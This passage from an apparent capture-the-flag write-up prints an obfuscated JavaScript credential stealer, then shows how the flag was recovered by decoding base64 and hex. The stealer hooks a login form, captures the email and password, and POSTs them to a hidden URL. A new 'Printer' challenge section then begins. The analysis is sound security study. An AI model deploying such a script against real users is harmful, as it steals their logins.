class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x130&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x138&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x33c5a7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x133&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x368422&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x310b10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x4b6c7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b6c7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]());}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x577a0b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b6c7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b6c7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]());}}}(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0xe982&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6072f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x3655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0xb7f3a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b9901&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0xe98259&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0xe982&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x3655&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x365592&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x40b5c5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x365592&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x365592&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x129&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x453e01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0xe98259&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x365592&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x453e01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;},&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0xb7f3a5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4b9901&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);}&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1fd9bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x139&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1fd9bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x5245ac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1fd9bc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x5245ac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x7df5ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x129&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3ac123&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)](&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x2b2d27&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x134&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)](&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3c8b18&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x134&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)](&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1f5338&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;createCipher&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x137&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x2b2d27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1f5338&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3c8b18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1f5338&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x132&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x144&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x12c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;atob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x140&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1f5338&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;finish&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_0x52a7fa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x1f5338&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x131&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x142&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]()),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4ca5b3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x7df5ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3ac123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x52a7fa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4ca5b3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;application/json&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x9e8024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x143&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x4ca5b3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)});});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If I were to guess, I’d think that this script takes one of the hard coded strings at the top, and performs some modifications to create the flag. After a couple of minutes of trying to reverse engineer the script, I decided to start messing around with one of those values. Taking the longest one, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NDMzMTdiNjgzMDcwMzM1Zjc5MzA3NTVmNjQzMTY0NmU3NDVmNzU3MzMzNWYzNDVmNzIzNDMzMzE1ZjcwMzQ3MzczNzczMDcyNjQ3ZA==&lt;/code&gt; and converting it from base64, we get the hex string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;43317b683070335f7930755f6431646e745f7573335f345f723433315f70347373773072647d&lt;/code&gt;. Converting that from hex to ascii, we get the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C1{h0p3_y0u_d1dnt_us3_4_r431_p4ssw0rd}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Looking at the original script, it seems like the client-side json takes that long binary string, decodes it, then creates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag to run this javascript. I bet it would be possible to retrieve the flag from memory, but statically analyzing a malicious script is often less dangerous.&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
&lt;p&gt;In this challenge we are given a link to a website with an admin page. The website is down, but I managed to save it on the Wayback Machine &lt;a href=&quot;https://web.archive.org/web/20240518231832/https://web-printer-t34jla4lcq-uc.a.run.app/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/blog/week8/printer-login.png&quot; alt=&quot;assets/images/blog/week8/printer-login.png&quot; /&gt;&lt;/p&gt;

